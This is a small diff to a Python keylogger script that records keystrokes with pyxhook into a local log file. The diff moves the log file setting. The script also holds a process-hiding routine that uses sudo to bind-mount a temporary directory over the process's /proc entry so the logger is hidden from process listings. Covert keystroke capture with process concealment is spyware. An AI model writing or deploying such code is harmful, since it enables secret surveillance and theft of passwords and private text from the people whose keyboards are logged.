@@ -5,6 +5,9 @@ import pyxhook
 import string
 import random
 
+# set file to log keystrokes
+log_file = "./file.log"
+
 def hide_process():
 	ch = string.uppercase + string.digits
 	# Bind mount - works with root on linux
@@ -14,9 +17,7 @@ def hide_process():
 	if os.path.isdir("/tmp/{0}".format(token)) is False:
 		if os.system("sudo whoami") == 'root':
 			os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
-  
-# set file to log keystrokes
-log_file = "./file.log"
+ 
   
 #creating key pressing event and saving it into log file 
 def OnKeyPress(event): 
